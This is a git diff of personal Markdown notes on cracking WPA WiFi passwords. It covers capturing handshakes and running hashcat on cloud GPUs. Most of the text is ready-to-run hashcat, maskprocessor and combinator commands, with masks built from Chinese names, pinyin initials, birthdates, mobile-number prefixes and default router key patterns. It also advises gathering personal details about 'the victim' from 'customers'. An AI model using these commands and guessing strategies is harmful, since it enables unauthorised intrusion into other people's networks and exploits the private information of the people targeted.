@@ -1,4 +1,9 @@
 # Wifi Hacking Practice
+* 占空间小的用字典，字典组合起来比较灵活，如果字典太大了就用.hcmask
+* 积累多个待破解的hash一次性破解貌似比较省时省力。
+## Policy
+Lots of hashes, only part of them cracked.
+Choose p3.x2large when tasks are few. p3dn.x24large when tasks are many and heavy. But the instances with more GPUs will save you times of time.
 ## Capturing packets
 ### Through capturing the `hccapx` file
 ### Or through capturing the PMKID frames
@@ -9,19 +14,165 @@
 ## Allocate and run hashtoplis
 ### The free tire instance as the server? And the instances in the Auto-Scaling group as the client.
 ## Passwords Trying Sequences (with `-z`)
+### For China Union Home Routers CU_XXXX
+* sometimes the key is XXXX?l?l?l?l
+* sometimes the key is -1 ?d?l ?1?1?1?1?1?1?1?1
 ### personal information and variants (using combination or dictionary and rules)
 Ask as much information as you can from the customers knowing about the victim.
 #### ESSID and variants
+If the base words is too short and you need to run a rule-based attack, you should run the following command on the local computer:
+`$ hashcat64.exe basewords.txt -r best64.rule | hashcat64.exe -m 2500 mywpa.hccapx -w 3`
 #### Store Name and variants
 #### telephone number of store and variants
 #### Sites(Street, Road, Lane, Residential Quater, Building, Unit, Room) and variants
 #### Mobile phone number(if have any or the mobile phone numbers of the local city) and variants
 ### Leaked and Commonly used passwords (using dictionaries)
+Use Dropbox APP on Windows to sync.
 ### numbers (using brute-force)
-#### 6, 7, 8, 9 or 10 digits
-#### 11 mobile numbers
+#### 6, 8 digits
+### combinations
+* 名字全拼+4digits
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 6 names_cn.txt 1234d.hcmask`
+* 姓全拼+4digits
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 6 family_names.txt 1234d.hcmask`
+* 声母+年月日
+    * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 shengmu.txt years_months_days.txt`
+* 声母+月日
+    * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 shengmu.txt months_days.txt`
+* 月日+声母
+    * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 months_days.txt shengmu.txt `
+* 声母+声母
+    `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 shengmu.txt shengmu.txt`
+* 声母+声母
+    `./hashcat64.bin -m 2500 TP-LINK_54AA-01.hccapx -w 3 -a 1 shengmu.txt shengmu.txt`
+* 声母+月日+声母+月日
+    `hashcat64.exe --force -m 2500 hash_file -a 1 shengmu_months_days.txt shengmu_months_days.txt`
+* 声母+声母+1/2/3/4digits
+    * 1/2/3/4digits
+
+        cat 1234d.hcmask
+
+        ?d
+        ?d?d
+        ?d?d?d
+        ?d?d?d?d
+    * `./hashcat-utils-1.9/bin/combinator3.bin shengmu.txt shengmu.txt 1234d.txt | ./hashcat64.bin -m 2500 TP-LINK_54AA-01.hccapx -a 0`
+* 名字全拼＋年月日
+    `./hashcat64.bin -m 2500 hash.hccapx -a 1 name_cn.txt years_months_days.txt`
+* 名字全拼＋月日
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 name_cn.txt months_days.txt`
+* 姓全拼＋年月日
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 family_names.txt years_months_days.txt`
+* 年月日＋姓全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 years_months_days.txt family_names.txt `
+* 姓全拼＋月日
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 family_names.txt months_days.txt`
+* 月日＋姓全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 months_days.txt family_names.txt `
+* 年月日＋年月日
+    * `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 years_months_days.txt years_months_days.txt`
+* 月日＋月日
+    * `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 months_days.txt months_days.txt`
+* 年月日＋月日
+    * `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 years_months_days.txt months_days.txt`
+* 声母+11位手机号
+    * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 6 shengmu.txt 11mobile.hcmask`
+    * `hashcat.bin -m 2500 hashfile -a 1 shengmu.txt beijing_phonenumbers.txt`
+* 11位手机号+声母
+    * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 7 11mobile.hcmask shengmu.txt`
+    * `hashcat64.bin -w 3 -m 2500 hashfile -a 1 beijing_phonenumbers.txt shengmu.txt`
+* 名字全拼＋手机号
+    * `./hashcat64.bin -m 2500 hash.hccapx -a 6 name_cn.txt mobile_number_mask.hcmask`
+    * `hashcat64.bin -w 3 -m 2500 hashfile -a 1 names_cn.txt beijing_phonenumbers.txt`
+* 手机号＋名字全拼
+    * `./hashcat64.bin -m 2500 hash.hccapx -a 7 mobile_number_mask.hcmask name_cn.txt`
+    * `hashcat64.bin -w 3 -m 2500 hashfile -a 1 beijing_phonenumbers.txt names_cn.txt`
+* 姓全拼＋手机号
+    * `./hashcat64.bin -m 2500 hash.hccapx -a 6 family_names.txt mobile_number_mask.hcmask`
+    * `hashcat64.bin -w 3 -m 2500 hashfile -a 1 family_names.txt beijing_phonenumbers.txt`
+* 手机号＋姓全拼
+    * `./hashcat64.bin -m 2500 hash.hccapx -a 7 mobile_number_mask.hcmask family_names.txt`
+    * `hashcat64.bin -w 3 -m 2500 hashfile -a 1 beijing_phonenumbers.txt family_names.txt`
+* 名字全拼＋名字全拼＋月日
+    `./hashcat-utils-1.9/bin/combinator3.bin names_cn.txt names_cn.txt months_days.txt | ./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 0`
+* 名字全拼＋月日＋名字全拼
+    `./hashcat-utils-1.9/bin/combinator3.bin names_cn.txt months_days.txt names_cn.txt | ./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 0`
+* 姓全拼＋姓全拼＋月日
+`J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator3.exe family_names.txt family_names.txt months_days.txt | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx`
+* 姓全拼＋月日＋姓全拼
+`J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator3.exe family_names.txt months_days.txt family_names.txt | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx`
+* 声母+love+声母
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 shengmu.txt shengmu.txt -j '$l$o$v$e'`
+* 名字全拼+love+名字全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 names_cn.txt names_cn.txt -j '$l$o$v$e`
+* 姓全拼+love+姓全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 family_names.txt family_names.txt -j '$l$o$v$e`
+* 声母+ai+声母
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 shengmu.txt shengmu.txt -j '$a$i'`
+* 名字全拼+ai+名字全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 names_cn.txt names_cn.txt -j '$a$i`
+* 姓全拼+ai+姓全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 family_names.txt family_names.txt -j '$a$i`
+### cannot be run on hashtopolis
+* 11位手机号mask
+
+        cat 11mobile.hcmask
+
+        130?d?d?d?d?d?d?d?d
+        131?d?d?d?d?d?d?d?d
+        132?d?d?d?d?d?d?d?d
+        133?d?d?d?d?d?d?d?d
+        134?d?d?d?d?d?d?d?d
+        135?d?d?d?d?d?d?d?d
+        136?d?d?d?d?d?d?d?d
+        137?d?d?d?d?d?d?d?d
+        138?d?d?d?d?d?d?d?d
+        139?d?d?d?d?d?d?d?d
+        145?d?d?d?d?d?d?d?d
+        146?d?d?d?d?d?d?d?d
+        147?d?d?d?d?d?d?d?d
+        148?d?d?d?d?d?d?d?d
+        149?d?d?d?d?d?d?d?d
+        150?d?d?d?d?d?d?d?d
+        151?d?d?d?d?d?d?d?d
+        152?d?d?d?d?d?d?d?d
+        153?d?d?d?d?d?d?d?d
+        155?d?d?d?d?d?d?d?d
+        156?d?d?d?d?d?d?d?d
+        157?d?d?d?d?d?d?d?d
+        158?d?d?d?d?d?d?d?d
+        159?d?d?d?d?d?d?d?d
+        166?d?d?d?d?d?d?d?d
+        171?d?d?d?d?d?d?d?d
+        172?d?d?d?d?d?d?d?d
+        173?d?d?d?d?d?d?d?d
+        174?d?d?d?d?d?d?d?d
+        175?d?d?d?d?d?d?d?d
+        176?d?d?d?d?d?d?d?d
+        177?d?d?d?d?d?d?d?d
+        178?d?d?d?d?d?d?d?d
+        180?d?d?d?d?d?d?d?d
+        181?d?d?d?d?d?d?d?d
+        182?d?d?d?d?d?d?d?d
+        183?d?d?d?d?d?d?d?d
+        184?d?d?d?d?d?d?d?d
+        186?d?d?d?d?d?d?d?d
+        187?d?d?d?d?d?d?d?d
+        188?d?d?d?d?d?d?d?d
+        189?d?d?d?d?d?d?d?d
+        199?d?d?d?d?d?d?d?d
+        198?d?d?d?d?d?d?d?d
+    * [beijing phone numbers](http://www.hiphop8.com/city/beijing/beijing.php)
+
+### brute-force (??? will take a long long time???)
+?a?a?a?a?a?a
+?a?a?a?a?a?a?a
+?a?a?a?a?a?a?a?a
+?a?a?a?a?a?a?a?a?a
+?a?a?a?a?a?a?a?a?a?a
+
 ### 组合猜想
-* 2声母＋年月日 (vice versa)
+* ~~2声母＋年月日 (vice versa)~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,98765,01,0123,?1?1?2?d?3?d?4?d`
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,98765,01,0123,?1?119?2?d?3?d?4?d`
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,01,0123,?1?120?2?d?3?d?4?d`
@@ -39,17 +190,18 @@ Ask as much information as you can from the customers knowing about the victim.
     `zcsZCS,01,01,0123,20?2?d?3?d?4?d?1h?1`
     `zcsZCS,01,01,0123,?2?d?3?d?4?d?1h?1`
 
-    * 2声母
+    * ~~2声母~~
         * `./maskprocessor-0.73/mp64.bin -1 bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO "\$?1\$?1" -o append_2zz.rule`
         * `./maskprocessor-0.73/mp64.bin -1 zcsZCS -2  bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO "\$?1\$h\$?2" -o append_2zhz.rule`
         * `./maskprocessor-0.73/mp64.bin -1 zcsZCS -2  bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO "\$?2\$?1\$h" -o append_2zzh.rule`
         * `./maskprocessor-0.73/mp64.bin -1 zcsZCS "\$?1\$h\$?1\$h" -o append_2zhzh.rule`
         * `cat append_2zz.rule append_2zhz.rule append_2zzh.rule append_2zhzh.rule > append_2shengmu.rule`
         * `hashcat64.exe -D 2 -a 0 1.txt -r append_2shengmu.rule --stdout > 2shengmu.txt`
-    * 2声母+年月日
-        * `hashcat64.exe `
-    * 年月日+2声母
-* 3声母＋年月日 (vice versa)
+    * ~~2声母+年月日~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 2shengmu.txt years_months_days.txt`
+    * ~~年月日+2声母~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 years_months_days.txt 2shengmu.txt `
+* ~~3声母＋年月日 (vice versa)~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,98765,01,0123,?1?1?1?2?d?3?d?4?d`
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,98765,01,0123,?1?1?119?2?d?3?d?4?d`
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,01,0123,?1?1?120?2?d?3?d?4?d`
@@ -66,7 +218,18 @@ Ask as much information as you can from the customers knowing about the victim.
     `zcsZCS,98765,01,0123,?1h?1?1?19?2?d?3?d?4?d`
     `zcsZCS,01,01,0123,?1h?1?120?2?d?3?d?4?d`
     `zcsZCS,01,01,0123,?1h?1?1?2?d?3?d?4?d`
-* 2声母＋11位手机号 (vice versa)
+    * ~~3声母~~
+        * `./maskprocessor-0.73/mp64.bin -1 bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO "\$?1\$?1\$?1" -o append_3zzz.rule`
+        * `./maskprocessor-0.73/mp64.bin -1 zcsZCS -2  bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO "\$?1\$h\$?2\$?2" -o append_3zhzz.rule`
+        * `cat append_3zzz.rule append_3zhzz.rule > append_3shengmu.rule`
+        * `hashcat64.exe -D 2 -a 0 1.txt -r append_3shengmu.rule --stdout > 3shengmu.txt`
+    * ~~声母~~
+        * `cat 2shengmu.txt 3shengmu.txt > shengmu.txt`
+    * ~~3声母+年月日~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 3shengmu.txt years_months_days.txt`
+    * 声母+年月日
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 shengmu.txt years_months_days.txt`
+* ~~2声母＋11位手机号 (vice versa)~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,?1?1130?d?d?d?d?d?d?d?d`
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,130?d?d?d?d?d?d?d?d?1?1`
     `zcsZCS,?1h?1130?d?d?d?d?d?d?d?d`
@@ -243,7 +406,60 @@ Ask as much information as you can from the customers knowing about the victim.
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,198?d?d?d?d?d?d?d?d?1?1`
     `zcsZCS,?1h?1198?d?d?d?d?d?d?d?d`
     `zcsZCS,198?d?d?d?d?d?d?d?d?1h?1`
-* 3声母＋11位手机号 (vice versa)
+    * 11位手机号mask
+
+        cat 11mobile.hcmask
+
+        130?d?d?d?d?d?d?d?d
+        131?d?d?d?d?d?d?d?d
+        132?d?d?d?d?d?d?d?d
+        133?d?d?d?d?d?d?d?d
+        134?d?d?d?d?d?d?d?d
+        135?d?d?d?d?d?d?d?d
+        136?d?d?d?d?d?d?d?d
+        137?d?d?d?d?d?d?d?d
+        138?d?d?d?d?d?d?d?d
+        139?d?d?d?d?d?d?d?d
+        145?d?d?d?d?d?d?d?d
+        146?d?d?d?d?d?d?d?d
+        147?d?d?d?d?d?d?d?d
+        148?d?d?d?d?d?d?d?d
+        149?d?d?d?d?d?d?d?d
+        150?d?d?d?d?d?d?d?d
+        151?d?d?d?d?d?d?d?d
+        152?d?d?d?d?d?d?d?d
+        153?d?d?d?d?d?d?d?d
+        155?d?d?d?d?d?d?d?d
+        156?d?d?d?d?d?d?d?d
+        157?d?d?d?d?d?d?d?d
+        158?d?d?d?d?d?d?d?d
+        159?d?d?d?d?d?d?d?d
+        166?d?d?d?d?d?d?d?d
+        171?d?d?d?d?d?d?d?d
+        172?d?d?d?d?d?d?d?d
+        173?d?d?d?d?d?d?d?d
+        174?d?d?d?d?d?d?d?d
+        175?d?d?d?d?d?d?d?d
+        176?d?d?d?d?d?d?d?d
+        177?d?d?d?d?d?d?d?d
+        178?d?d?d?d?d?d?d?d
+        180?d?d?d?d?d?d?d?d
+        181?d?d?d?d?d?d?d?d
+        182?d?d?d?d?d?d?d?d
+        183?d?d?d?d?d?d?d?d
+        184?d?d?d?d?d?d?d?d
+        186?d?d?d?d?d?d?d?d
+        187?d?d?d?d?d?d?d?d
+        188?d?d?d?d?d?d?d?d
+        189?d?d?d?d?d?d?d?d
+        199?d?d?d?d?d?d?d?d
+        198?d?d?d?d?d?d?d?d
+
+    * ~~2声母+11位手机号~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 6 2shengmu.txt 11mobile.hcmask`
+    * ~~11位手机号+2声母~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 7 11mobile.hcmask 2shengmu.txt`
+* ~~3声母＋11位手机号 (vice versa)~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,?1?1?1130?d?d?d?d?d?d?d?d`
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,130?d?d?d?d?d?d?d?d?1?1?1`
     `zcsZCS,?1h?1?1130?d?d?d?d?d?d?d?d`
@@ -420,17 +636,37 @@ Ask as much information as you can from the customers knowing about the victim.
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,198?d?d?d?d?d?d?d?d?1?1?1`
     `zcsZCS,?1h?1?1198?d?d?d?d?d?d?d?d`
     `zcsZCS,198?d?d?d?d?d?d?d?d?1h?1?1`
-* 2声母＋月日 (vice versa)
+    * ~~3声母+11位手机号~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 6 3shengmu.txt 11mobile.hcmask`
+    * ~~11位手机号+3声母~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 7 11mobile.hcmask 3shengmu.txt`
+    * 声母+11位手机号
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 6 shengmu.txt 11mobile.hcmask`
+    * 11位手机号+声母
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 7 11mobile.hcmask shengmu.txt`
+* ~~2声母＋月日 (vice versa)~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,0123,?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?2?d?3?d`
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,0123,?2?d?3?d?1?1`
     `zcsZCS,01,0123,?2?d?3?d?1h?1`
-* 3声母＋月日 (vice versa)
+    * ~~2声母+月日~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 2shengmu.txt months_days.txt`
+    * ~~月日+2声母~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 months_days.txt 2shengmu.txt `
+* ~~3声母＋月日 (vice versa)~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,0123,?1?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?1?2?d?3?d`
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,0123,?2?d?3?d?1?1?1`
     `zcsZCS,01,0123,?2?d?3?d?1h?1?1`
-* 2声母+3声母+1/2/3/4digits (vice versa)
+    * ~~3声母+月日~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 3shengmu.txt months_days.txt`
+    * ~~月日+3声母~~
+        * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 months_days.txt 3shengmu.txt `
+* 声母+月日
+    * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 shengmu.txt months_days.txt`
+* 月日+声母
+    * `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 months_days.txt shengmu.txt `
+* ~~2声母+3声母+1/2/3/4digits (vice versa)~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,?1?1?1?1?1?d`
     `zcsZCS,?1h?1?1?1?1?d`
     `zcsZCS,?1h?1?1?1h?1?d`
@@ -447,7 +683,25 @@ Ask as much information as you can from the customers knowing about the victim.
     `zcsZCS,?1h?1?1?1?1?d?d?d?d`
     `zcsZCS,?1h?1?1?1h?1?d?d?d?d`
     `zcsZCS,?1?1?1?1h?1?d?d?d?d`
-* 3声母+3声母
+* 声母+声母
+    `hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 shengmu.txt shengmu.txt`
+* 声母+声母+1/2/3/4digits
+    * 1/2/3/4digits
+
+        cat 1234d.hcmask
+
+        ?d
+        ?d?d
+        ?d?d?d
+        ?d?d?d?d
+    * ~~`\hashcat-utils-1.9\bin\combinator.exe shengmu.txt shengmu.txt > shengmu_shengmu.txt | hashcat64.exe --force -m 2500 -a 6 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx shengmu_shengmu.txt 1234d.hcmask ` (If prompted with errors, try this command once again. But it cannot cover full passwords through this way.)~~
+    * ~~`hashcat64.exe -D 2 -a 3 1234d.hcmask --stdout > 1234d.txt`~~
+        ~~`hashcat-utils-1.9\bin\combinator3.exe shengmu.txt shengmu.txt 1234d.txt > shengmu_shengmu_1234d.txt | hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 0 shengmu_shengmu_1234d.txt` (This will also not work as expected.)~~
+    * ~~`./hashcat-utils-1.9/bin/combinator.bin shengmu.txt 1234d.txt > shengmu_1234d.txt`~~
+        ~~`hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 shengmu.txt shengmu_1234d.txt`~~
+    * `./hashcat-utils-1.9/bin/combinator3.bin shengmu.txt shengmu.txt 1234d.txt | ./hashcat64.bin -m 2500 TP-LINK_54AA-01.hccapx -a 0`
+
+* ~~3声母+3声母~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,?1?1?1?1?1?1?d`
     `zcsZCS,?1h?1?1?1?1?1?d`
     `zcsZCS,?1h?1?1?1?1h?1?1?d`
@@ -464,27 +718,33 @@ Ask as much information as you can from the customers knowing about the victim.
     `zcsZCS,?1h?1?1?1?1?1?d?d?d?d`
     `zcsZCS,?1h?1?1?1?1h?1?1?d?d?d?d`
     `zcsZCS,?1?1?1?1h?1?1?d?d?d?d`
-* 2声母+月日+2声母+月日
+* 声母+声母
+    `./hashcat64.bin -m 2500 TP-LINK_54AA-01.hccapx -w 3 -a 1 shengmu.txt shengmu.txt`
+* ~~2声母+月日+2声母+月日~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,0123,?1?1?2?d?3?d?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?2?d?3?d?1h?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?2?d?3?d?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1?1?2?d?3?d?1h?1?2?d?3?d`
-* 3声母+月日+3声母+月日
+* ~~3声母+月日+3声母+月日~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,0123,?1?1?1?2?d?3?d?1?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?1?2?d?3?d?1h?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?1?2?d?3?d?1?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1?1?1?2?d?3?d?1h?1?1?2?d?3?d`
-* 2声母+月日+3声母+月日
+* ~~2声母+月日+3声母+月日~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,0123,?1?1?2?d?3?d?1?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?2?d?3?d?1h?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?2?d?3?d?1?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1?1?2?d?3?d?1h?1?1?2?d?3?d`
-* 3声母+月日+2声母+月日
+* ~~3声母+月日+2声母+月日~~
     `bpmfdtnlgkhjqxzcsrywaoBPMFDTNLGKJHQXZCSRYWAO,01,0123,?1?1?1?2?d?3?d?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?1?2?d?3?d?1h?1?2?d?3?d`
     `zcsZCS,01,0123,?1h?1?1?2?d?3?d?1?1?2?d?3?d`
     `zcsZCS,01,0123,?1?1?1?2?d?3?d?1h?1?2?d?3?d`
-* 名字全拼＋年月日
+* 声母+月日+声母+月日
+    * `./hashcat-utils-1.9/bin/combinator.bin shengmu.txt months_days.txt > shengmu_months_days.txt`
+        `hashcat64.exe --force -m 2500 hash_file -a 1 shengmu_months_days.txt shengmu_months_days.txt`
+    * ~~`hashcat-utils-1.9\bin\combinator.exe shengmu.txt months_days > shengmu_months_days.txt | hashcat64.exe --force -m 2500 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx -a 1 shengmu_months_days.txt shengmu_months_days.txt`~~ (If prompted with errors, try this command once again. But it seems that it cannot cover full passwords through this way.)
+* ~~名字全拼＋年月日~~
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 lname_cn.txt -1 98765 -2 01 -3 0123 ?1?d?2?d?3?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 lname_cn.txt -1 98765 -2 01 -3 0123 19?1?d?2?d?3?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 lname_cn.txt -1 01 -2 01 -3 0123 ?1?d?2?d?3?d`
@@ -497,11 +757,15 @@ Ask as much information as you can from the customers knowing about the victim.
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 name_cn.txt -1 98765 -2 01 -3 0123 19?1?d?2?d?3?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 name_cn.txt -1 01 -2 01 -3 0123 ?1?d?2?d?3?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 name_cn.txt -1 01 -2 01 -3 0123 20?1?d?2?d?3?d`
-* 名字全拼＋月日
+* 名字全拼＋年月日
+    `./hashcat64.bin -m 2500 hash.hccapx -a 1 name_cn.txt years_months_days.txt`
+* ~~名字全拼＋月日~~
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 lname_cn.txt -1 01 -2 0123 ?1?d?2?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 cname_cn.txt -1 01 -2 0123 ?1?d?2?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 name_cn.txt -1 01 -2 0123 ?1?d?2?d`
-* 名字全拼＋手机号 (vice versa)
+* 名字全拼＋月日
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 name_cn.txt months_days.txt`
+* ~~名字全拼＋手机号 (vice versa)~~
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 acname_cn.txt 130?d?d?d?d?d?d?d?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 acname_cn.txt 131?d?d?d?d?d?d?d?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 acname_cn.txt 132?d?d?d?d?d?d?d?d`
@@ -634,7 +898,13 @@ Ask as much information as you can from the customers knowing about the victim.
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 cname_cn.txt 189?d?d?d?d?d?d?d?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 cname_cn.txt 199?d?d?d?d?d?d?d?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 cname_cn.txt 198?d?d?d?d?d?d?d?d`
-* 姓全拼＋年月日 (vice versa)
+* 名字全拼＋手机号
+    `./hashcat64.bin -m 2500 hash.hccapx -a 6 name_cn.txt mobile_number_mask.hcmask`
+* 手机号＋名字全拼
+    `./hashcat64.bin -m 2500 hash.hccapx -a 7 mobile_number_mask.hcmask name_cn.txt`
+* ~~手机号+名字全拼~~
+    `./hashcat64.bin -m 2500 hash.hccapx -a 6 name_cn.txt mobile_number_mask.hcmask`
+* ~~姓全拼＋年月日 (vice versa)~~
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 lfamily_name.txt -1 98765 -2 01 -3 0123 ?1?d?2?d?3?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 lfamily_name.txt -1 98765 -2 01 -3 0123 19?1?d?2?d?3?d`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 6 lfamily_name.txt -1 01 -2 01 -3 0123 ?1?d?2?d?3?d`
@@ -659,14 +929,22 @@ Ask as much information as you can from the customers knowing about the victim.
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 -1 98765 -2 01 -3 0123 19?1?d?2?d?3?d ufamily_name.txt`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 -1 01 -2 01 -3 0123 ?1?d?2?d?3?d ufamily_name.txt`
     `hashcat64.exe --force -m 2500 hash.hccapx -a 7 -1 01 -2 01 -3 0123 20?1?d?2?d?3?d ufamily_name.txt`
-* 姓全拼＋月日 (vice versa)
+* 姓全拼＋年月日
+    `./hashcat64.bin -m 2500 hash.hccapx -w 3 -a 1 family_names.txt years_months_days.txt`
+* 年月日＋姓全拼
